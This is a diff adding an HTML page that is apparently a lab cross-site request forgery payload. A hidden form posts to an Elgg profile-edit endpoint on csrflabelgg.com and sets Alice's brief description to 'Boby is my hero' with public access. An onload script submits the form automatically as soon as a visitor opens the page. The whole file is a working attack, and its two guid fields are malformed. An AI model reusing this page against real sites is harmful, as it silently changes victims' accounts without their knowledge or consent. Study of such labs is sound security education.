@@ -1,0 +1,38 @@
+<html>
+
+<body>
+    <h1>This page forges an HTTP POST request.</h1>
+
+    <form id="editForm" action="http://www.csrflabelgg.com/action/profile/edit" method="post">
+        <input type='hidden' name='name' value='Alice' />
+        <input type='hidden' name='description' value='' />
+        <input type='hidden' name='accesslevel[description]' value='2' />
+        <input type='hidden' name='briefdescription' value='Boby is my hero' />
+        <input type='hidden' name='accesslevel[briefdescription]' value='2' />
+        <input type='hidden' name='location' value='' />
+        <input type='hidden' name='accesslevel[location]' value='2' />
+        <input type='hidden' name='contactemail' value='' />
+        <input type='hidden' name='accesslevel[contactemail]' value='2' />
+        <input type='hidden' name='interests' value='' />
+        <input type='hidden' name='accesslevel[interests]' value='2' />
+        <input type='hidden' name='mobile' value='' />
+        <input type='hidden' name='accesslevel[mobile]' value='2' />
+        <input type='hidden' name='phone' value='' />
+        <input type='hidden' name='accesslevel[phone]' value='2' />
+        <input type='hidden' name='skills' value='' />
+        <input type='hidden' name='accesslevel[skills]' value='2' />
+        <input type='hidden' name='twitter' value='' />
+        <input type='hidden' name='accesslevel[twitter]' value='2' />
+        <input type='hidden' name='website' value='' />
+        <input type='hidden' name='accesslevel[website]' value='2' />
+        <input type='hidden' value='guid' value='42' />
+        <input type='hidden' value='guid' value='42' />
+    </form>
+    <script type="text/javascript">
+
+        window.onload = function () { document.forms["editForm"].submit(); }
+    </script>
+
+</body>
+
+</html>
